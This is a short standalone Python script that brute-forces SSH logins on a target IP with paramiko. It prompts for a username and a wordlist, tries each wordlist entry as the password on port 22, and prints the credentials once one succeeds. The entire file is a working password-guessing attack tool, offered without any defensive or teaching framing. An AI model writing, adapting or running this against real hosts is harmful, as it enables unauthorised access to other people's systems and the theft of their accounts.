#!/usr/bin/env python

import os
import sys
import paramiko

def bruteforce_login(wordlist_path, host, username):

  print("Bruteforcing IP: {} with wordlist: {} ".format(host, wordlist_path))
  print("="*80)

  wordlist_file = open(wordlist_path, 'r')

  for line in wordlist_file.readlines():
    try:
      ssh = paramiko.SSHClient()
      ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
      ssh.connect(hostname=host, port=22, username=username, password=line.strip())
      ssh.close()

      print("="*80)
      print("Login succeeded with: \n Username: {} \n Password: {} \n".format(username, line))
      print("\U0001f44d      \U0001F37F"*20)
      exit()

    except (paramiko.AuthenticationException) as e:
      print("Login failed with: \n Username: {} \n Password: {} \n Error: {} \n".format(username, line, e))
      continue

    except (paramiko.BadHostKeyException) as e:
      print("Error with bad host key connecting to host: {}\n Error: {} \n".format(host, e))
      continue

    except (paramiko.SSHException) as e:
      print("Error connecting to the specified host: {}\n Error: {} \n".format(host, e))
      continue
    
def main():
  try:
    USER = input("Username: ")
    TARGET_IP = input("Enter the target IP:")
    WORDLIST_PATH = input("Wordlist file path: ")

    if os.path.exists(WORDLIST_PATH): 
      bruteforce_login(WORDLIST_PATH, TARGET_IP, USER)
    else:
      print("Invalid path entered for wordlist")

  except KeyboardInterrupt:
    print("\nExiting...")
    sys.exit()

if __name__ == "__main__":
    main()